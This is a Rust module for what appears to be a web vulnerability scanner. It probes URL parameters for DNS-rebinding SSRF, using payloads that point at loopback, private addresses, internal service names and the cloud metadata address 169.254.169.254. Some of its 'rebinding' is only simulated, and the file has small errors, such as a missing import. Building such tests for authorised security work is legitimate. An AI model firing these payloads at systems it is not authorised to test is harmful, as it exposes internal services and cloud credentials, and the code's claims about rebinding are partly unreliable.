//! DNS Rebinding Module
//!
//! Implements DNS rebinding logic to bypass local-host and internal-network restrictions.
//! Uses nip.io, sslip.io, and custom domains for controlled rebinding attacks.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use std::collections::HashMap;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::PayloadRegistry;
use crate::http::client::HttpClient;

/// DNS rebinding configuration
#[derive(Debug, Clone)]
pub struct RebindConfig {
    /// Domain that resolves to 127.0.0.1 initially
    pub initial_domain: String,
    /// Domain that resolves to target internal IP after TTL expires
    pub rebound_domain: String,
    /// TTL in seconds for initial resolution
    pub initial_ttl: u32,
    /// TTL in seconds for rebound resolution
    pub rebound_ttl: u32,
    /// Target internal IP to rebind to
    pub target_ip: String,
}

/// Pre-configured rebinding domains
pub struct RebindDomains;

impl RebindDomains {
    /// nip.io domains (resolves to IP in subdomain)
    pub const NIP_IO: &'static [&'static str] = &[
        "nip.io",
        "sslip.io",
        "xip.io",
        "local.127.0.0.1.nip.io",
        "local.10.0.0.1.nip.io",
        "local.192.168.1.1.nip.io",
        "local.169.254.169.254.nip.io",
    ];

    /// Custom rebinding domains (require attacker-controlled DNS)
    pub const CUSTOM: &'static [&'static str] = &[
        "rb.127.0.0.1.attacker.com",
        "rb.localhost.attacker.com",
        "rb.internal.attacker.com",
        "rebind.127.0.0.1.attacker.com",
        "rebind.localhost.attacker.com",
    ];

    /// Generate nip.io domain for any IP
    pub fn nip_io(ip: &str) -> String {
        format!("{}.nip.io", ip.replace('.', "-"))
    }

    /// Generate sslip.io domain for any IP
    pub fn sslip_io(ip: &str) -> String {
        format!("{}.sslip.io", ip.replace('.', "-"))
    }

    /// Generate xip.io domain for any IP
    pub fn xip_io(ip: &str) -> String {
        format!("{}.xip.io", ip.replace('.', "-"))
    }
}

/// DNS rebinding attack module
pub struct DnsRebindingModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    rebind_configs: Vec<RebindConfig>,
    dns_cache: HashMap<String, (String, Instant)>, // domain -> (ip, resolved_at)
}

impl DnsRebindingModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            rebind_configs: Self::default_configs(),
            dns_cache: HashMap::new(),
        }
    }

    /// Default rebinding configurations
    fn default_configs() -> Vec<RebindConfig> {
        vec![
            RebindConfig {
                initial_domain: "127.0.0.1.nip.io".to_string(),
                rebound_domain: "127.0.0.1.nip.io".to_string(),
                initial_ttl: 1,
                rebound_ttl: 1,
                target_ip: "127.0.0.1".to_string(),
            },
            RebindConfig {
                initial_domain: "localhost.nip.io".to_string(),
                rebound_domain: "localhost.nip.io".to_string(),
                initial_ttl: 1,
                rebound_ttl: 1,
                target_ip: "127.0.0.1".to_string(),
            },
            RebindConfig {
                initial_domain: "10.0.0.1.nip.io".to_string(),
                rebound_domain: "10.0.0.1.nip.io".to_string(),
                initial_ttl: 1,
                rebound_ttl: 1,
                target_ip: "10.0.0.1".to_string(),
            },
            RebindConfig {
                initial_domain: "192.168.1.1.nip.io".to_string(),
                rebound_domain: "192.168.1.1.nip.io".to_string(),
                initial_ttl: 1,
                rebound_ttl: 1,
                target_ip: "192.168.1.1".to_string(),
            },
            RebindConfig {
                initial_domain: "169.254.169.254.nip.io".to_string(),
                rebound_domain: "169.254.169.254.nip.io".to_string(),
                initial_ttl: 1,
                rebound_ttl: 1,
                target_ip: "169.254.169.254".to_string(),
            },
            RebindConfig {
                initial_domain: "127.0.0.1.sslip.io".to_string(),
                rebound_domain: "127.0.0.1.sslip.io".to_string(),
                initial_ttl: 1,
                rebound_ttl: 1,
                target_ip: "127.0.0.1".to_string(),
            },
            RebindConfig {
                initial_domain: "10.0.0.1.sslip.io".to_string(),
                rebound_domain: "10.0.0.1.sslip.io".to_string(),
                initial_ttl: 1,
                rebound_ttl: 1,
                target_ip: "10.0.0.1".to_string(),
            },
            RebindConfig {
                initial_domain: "192.168.1.1.sslip.io".to_string(),
                rebound_domain: "192.168.1.1.sslip.io".to_string(),
                initial_ttl: 1,
                rebound_ttl: 1,
                target_ip: "192.168.1.1".to_string(),
            },
            RebindConfig {
                initial_domain: "169.254.169.254.sslip.io".to_string(),
                rebound_domain: "169.254.169.254.sslip.io".to_string(),
                initial_ttl: 1,
                rebound_ttl: 1,
                target_ip: "169.254.169.254".to_string(),
            },
        ]
    }

    /// Test DNS rebinding against a parameter
    async fn test_rebinding(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        config: &RebindConfig,
    ) -> Result<Option<Finding>, ModuleError> {
        // Phase 1: Initial request with domain resolving to safe IP
        let initial_payload = format!("http://{}", config.initial_domain);
        let initial_test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&initial_payload));
        
        let initial_response = self.http_client
            .get(&initial_test_url)
            .timeout(Duration::from_millis(5000))
            .send()
            .await;

        let initial_success = initial_response.is_ok();
        
        // Phase 2: Wait for DNS TTL to expire (simulated)
        // In real attack, we'd wait for TTL. Here we test immediate rebinding.
        tokio::time::sleep(Duration::from_millis(100)).await;

        // Phase 3: Second request - domain should now resolve to target IP
        let rebound_payload = format!("http://{}", config.rebound_domain);
        let rebound_test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&rebound_payload));
        
        let rebound_response = self.http_client
            .get(&rebound_test_url)
            .timeout(Duration::from_millis(5000))
            .send()
            .await;

        if let Ok(response) = rebound_response {
            let status = response.status().as_u16();
            let headers: Vec<(String, String)> = response
                .headers()
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                .collect();
            let body = response.bytes().await
                .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

            // Check if response indicates access to internal service
            if self.is_internal_access(&body, &headers, status) {
                let evidence = self.create_rebind_evidence(
                    &rebound_test_url, &body, &headers, status, config, initial_success
                );
                
                let finding = Finding::new(
                    "dns_rebinding_ssrf",
                    FindingSeverity::High,
                    "DNS Rebinding SSRF",
                    format!("DNS rebinding allows access to internal IP {} via parameter '{}'", config.target_ip, param_name),
                    &ctx.target_url,
                )
                .with_method("GET")
                .with_payload(format!("Initial: {}, Rebound: {}", config.initial_domain, config.rebound_domain))
                .with_evidence(evidence)
                .with_confidence(85)
                .with_tags(vec!["ssrf", "dns-rebinding", "nip.io", "bypass", config.target_ip.replace('.', "-")])
                .with_cwe("CWE-918")
                .with_agent_id(ctx.agent_id);

                return Ok(Some(finding));
            }
        }

        Ok(None)
    }

    /// Test rapid DNS rebinding (multiple requests in quick succession)
    async fn test_rapid_rebinding(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        domain: &str,
        target_ip: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        // Send multiple rapid requests to catch rebinding window
        for i in 0..5 {
            let payload = format!("http://{}", domain);
            let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&payload));
            
            let response = self.http_client
                .get(&test_url)
                .timeout(Duration::from_millis(3000))
                .send()
                .await;

            if let Ok(resp) = response {
                let status = resp.status().as_u16();
                let headers: Vec<(String, String)> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();
                let body = resp.bytes().await
                    .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

                if self.is_internal_access(&body, &headers, status) {
                    let evidence = self.create_evidence(&test_url, &body, &headers, status, &payload);
                    let finding = Finding::new(
                        "dns_rebinding_rapid",
                        FindingSeverity::High,
                        "Rapid DNS Rebinding SSRF",
                        format!("Rapid DNS rebinding allows access to {} via parameter '{}' (attempt {})", target_ip, param_name, i + 1),
                        &ctx.target_url,
                    )
                    .with_method("GET")
                    .with_payload(payload)
                    .with_evidence(evidence)
                    .with_confidence(80)
                    .with_tags(vec!["ssrf", "dns-rebinding", "rapid", target_ip.replace('.', "-")])
                    .with_cwe("CWE-918")
                    .with_agent_id(ctx.agent_id);

                    return Ok(Some(finding));
                }
            }

            // Small delay between requests
            tokio::time::sleep(Duration::from_millis(50)).await;
        }

        Ok(None)
    }

    /// Test CNAME-based rebinding
    async fn test_cname_rebinding(
        &self,
        ctx: &CheckContext,
        param_name: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        // Test domains that use CNAME to internal services
        let cname_domains = [
            "internal.service.consul",
            "internal.service.nomad",
            "service.mesh",
            "localhost.service.consul",
            "redis.internal",
            "memcached.internal",
            "elasticsearch.internal",
            "db.internal",
            "mysql.internal",
            "postgres.internal",
            "mongodb.internal",
        ];

        for domain in &cname_domains {
            let payload = format!("http://{}", domain);
            let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&payload));
            
            let response = self.http_client
                .get(&test_url)
                .timeout(Duration::from_millis(5000))
                .send()
                .await;

            if let Ok(resp) = response {
                let status = resp.status().as_u16();
                let headers: Vec<(String, String)> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();
                let body = resp.bytes().await
                    .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

                if self.is_internal_access(&body, &headers, status) {
                    let evidence = self.create_evidence(&test_url, &body, &headers, status, &payload);
                    let finding = Finding::new(
                        "dns_rebinding_cname",
                        FindingSeverity::High,
                        "CNAME-based DNS Rebinding SSRF",
                        format!("CNAME rebinding to internal service '{}' via parameter '{}'", domain, param_name),
                        &ctx.target_url,
                    )
                    .with_method("GET")
                    .with_payload(payload)
                    .with_evidence(evidence)
                    .with_confidence(75)
                    .with_tags(vec!["ssrf", "dns-rebinding", "cname", "service-mesh"])
                    .with_cwe("CWE-918")
                    .with_agent_id(ctx.agent_id);

                    return Ok(Some(finding));
                }
            }
        }

        Ok(None)
    }

    /// Test TTL-based rebinding with controlled DNS
    async fn test_ttl_rebinding(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        attacker_domain: &str,
    ) -> Result<Option<Finding>, ModuleError> {
        // This would require an attacker-controlled DNS server
        // that returns 127.0.0.1 initially, then internal IP after TTL
        let test_domains = [
            format!("rb.127.0.0.1.{}", attacker_domain),
            format!("rb.localhost.{}", attacker_domain),
            format!("rebind.127.0.0.1.{}", attacker_domain),
        ];

        for domain in &test_domains {
            let payload = format!("http://{}", domain);
            let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&payload));
            
            // First request
            let response1 = self.http_client
                .get(&test_url)
                .timeout(Duration::from_millis(5000))
                .send()
                .await;

            // Wait for TTL to expire (simulated)
            tokio::time::sleep(Duration::from_millis(2000)).await;

            // Second request
            let response2 = self.http_client
                .get(&test_url)
                .timeout(Duration::from_millis(5000))
                .send()
                .await;

            if let Ok(resp) = response2 {
                let status = resp.status().as_u16();
                let headers: Vec<(String, String)> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();
                let body = resp.bytes().await
                    .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

                if self.is_internal_access(&body, &headers, status) {
                    let evidence = self.create_evidence(&test_url, &body, &headers, status, &payload);
                    let finding = Finding::new(
                        "dns_rebinding_ttl",
                        FindingSeverity::Critical,
                        "TTL-based DNS Rebinding SSRF",
                        format!("TTL-based DNS rebinding confirmed via attacker-controlled domain '{}'", domain),
                        &ctx.target_url,
                    )
                    .with_method("GET")
                    .with_payload(payload)
                    .with_evidence(evidence)
                    .with_confidence(95)
                    .with_tags(vec!["ssrf", "dns-rebinding", "ttl", "attacker-controlled", "confirmed"])
                    .with_cwe("CWE-918")
                    .with_agent_id(ctx.agent_id);

                    return Ok(Some(finding));
                }
            }
        }

        Ok(None)
    }

    /// Check if response indicates access to internal service
    fn is_internal_access(&self, body: &Bytes, headers: &[(String, String)], status: u16) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        // Cloud metadata indicators
        let metadata_indicators = [
            "ami-id", "instance-id", "instance-type", "local-ipv4", "public-ipv4",
            "security-groups", "iam/", "user-data", "metadata", "computeMetadata",
            "project-id", "zone", "machine-type", "network-interfaces",
            "subscription-id", "tenant-id", "resource-group", "vm-id", "vm-size",
            "droplet_id", "region", "interfaces", "ssh_keys", "user_data",
            "instance-id", "region-id", "zone-id", "private-ipv4", "ram-role",
            "compartment_id", "availability_domain",
        ];
        
        for indicator in &metadata_indicators {
            if body_str.to_lowercase().contains(&indicator.to_lowercase()) {
                return true;
            }
        }

        // Internal service banners
        let service_indicators = [
            "redis_version", "redis_mode", "connected_clients", "used_memory",
            "memcached", "version", "uptime", "elasticsearch", "cluster_name",
            "mongodb", "postgresql", "mysql", "mariadb", "cassandra",
            "consul", "nomad", "vault", "etcd", "zookeeper", "kafka",
        ];
        
        for indicator in &service_indicators {
            if body_str.to_lowercase().contains(&indicator.to_lowercase()) {
                return true;
            }
        }

        // Successful response with content from internal IP
        if (200..400).contains(&status) && body.len() > 100 {
            for (name, value) in headers {
                if name.to_lowercase() == "server" {
                    let server_lower = value.to_lowercase();
                    if server_lower.contains("nginx") || server_lower.contains("apache") 
                        || server_lower.contains("iis") || server_lower.contains("lighttpd")
                        || server_lower.contains("gunicorn") || server_lower.contains("uwsgi") {
                        return true;
                    }
                }
            }
        }

        false
    }

    /// Create evidence for rebinding finding
    fn create_rebind_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        config: &RebindConfig,
        initial_success: bool,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("DNS rebinding SSRF: initial_domain={}, rebound_domain={}, target_ip={}, initial_success={}", 
                config.initial_domain, config.rebound_domain, config.target_ip, initial_success),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 85,
        }
    }

    /// Create standard evidence
    fn create_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        payload: &str,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("DNS rebinding SSRF: payload='{}', status={}, bytes={}", payload, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 80,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for DnsRebindingModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("DNS Rebinding module initialized with {} configs", self.rebind_configs.len());
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "dns_rebinding_ssrf",
                "DNS Rebinding SSRF",
                "Implements DNS rebinding logic to bypass local-host and internal-network restrictions",
                Severity::High,
                CheckCategory::ServerSideRequestForgery,
            )
            .with_budget(ResourceBudget::advanced())
            .with_god_mode(true)
            .with_tags(vec!["ssrf", "dns-rebinding", "nip.io", "sslip.io", "bypass", "ttl", "cname"])
            .with_references(vec![
                "https://portswigger.net/web-security/ssrf/dns-rebinding",
                "https://owasp.org/www-community/attacks/DNS_Rebinding",
                "https://nip.io/",
                "https://sslip.io/",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata().requires_god_mode && !ctx.god_mode {
            return false;
        }
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(150);

        // Extract parameters
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Test standard rebinding configs (nip.io, sslip.io)
        for config in &self.rebind_configs {
            for param in &params {
                if request_count >= max_requests / 2 {
                    break;
                }

                if let Some(finding) = self.test_rebinding(&ctx, param, config).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        // Test rapid rebinding
        if request_count < max_requests * 3 / 4 {
            let rapid_domains = [
                ("127.0.0.1.nip.io", "127.0.0.1"),
                ("10.0.0.1.nip.io", "10.0.0.1"),
                ("192.168.1.1.nip.io", "192.168.1.1"),
                ("169.254.169.254.nip.io", "169.254.169.254"),
                ("127.0.0.1.sslip.io", "127.0.0.1"),
                ("10.0.0.1.sslip.io", "10.0.0.1"),
            ];

            for (domain, target_ip) in &rapid_domains {
                for param in &params {
                    if request_count >= max_requests * 3 / 4 {
                        break;
                    }

                    if let Some(finding) = self.test_rapid_rebinding(&ctx, param, domain, target_ip).await? {
                        findings.push(finding);
                    }
                    request_count += 1;
                }
            }
        }

        // Test CNAME rebinding
        if request_count < max_requests * 4 / 5 {
            for param in &params {
                if request_count >= max_requests * 4 / 5 {
                    break;
                }

                if let Some(finding) = self.test_cname_rebinding(&ctx, param).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        // Test TTL-based rebinding (god-mode only, requires attacker domain)
        if ctx.god_mode && request_count < max_requests {
            let attacker_domain = "attacker.com"; // In production, use actual domain
            for param in &params {
                if request_count >= max_requests {
                    break;
                }

                if let Some(finding) = self.test_ttl_rebinding(&ctx, param, attacker_domain).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        40 // Medium-high priority
    }

    fn dependencies(&self) -> &[&str] {
        &["basic_ssrf", "blind_ssrf"]
    }
}

impl DnsRebindingModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rebind_domains() {
        assert_eq!(RebindDomains::nip_io("127.0.0.1"), "127-0-0-1.nip.io");
        assert_eq!(RebindDomains::nip_io("10.0.0.1"), "10-0-0-1.nip.io");
        assert_eq!(RebindDomains::sslip_io("127.0.0.1"), "127-0-0-1.sslip.io");
        assert_eq!(RebindDomains::xip_io("127.0.0.1"), "127-0-0-1.xip.io");
    }

    #[test]
    fn test_default_configs() {
        let configs = DnsRebindingModule::default_configs();
        
        assert!(!configs.is_empty());
        assert!(configs.iter().any(|c| c.target_ip == "127.0.0.1"));
        assert!(configs.iter().any(|c| c.target_ip == "10.0.0.1"));
        assert!(configs.iter().any(|c| c.target_ip == "192.168.1.1"));
        assert!(configs.iter().any(|c| c.target_ip == "169.254.169.254"));
        assert!(configs.iter().any(|c| c.initial_domain.contains("nip.io")));
        assert!(configs.iter().any(|c| c.initial_domain.contains("sslip.io")));
    }

    #[test]
    fn test_is_internal_access_metadata() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = DnsRebindingModule::new(http_client, analysis_ctx, payload_registry);
        
        let body = Bytes::from("ami-12345678");
        let headers = vec![];
        
        assert!(module.is_internal_access(&body, &headers, 200));
    }

    #[test]
    fn test_is_internal_access_redis() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = DnsRebindingModule::new(http_client, analysis_ctx, payload_registry);
        
        let body = Bytes::from("redis_version:6.2.0");
        let headers = vec![];
        
        assert!(module.is_internal_access(&body, &headers, 200));
    }

    #[test]
    fn test_extract_parameters() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = DnsRebindingModule::new(http_client, analysis_ctx, payload_registry);
        
        let params = module.extract_parameters("http://example.com/api?user=test&id=123");
        assert_eq!(params, vec!["user", "id"]);
    }
}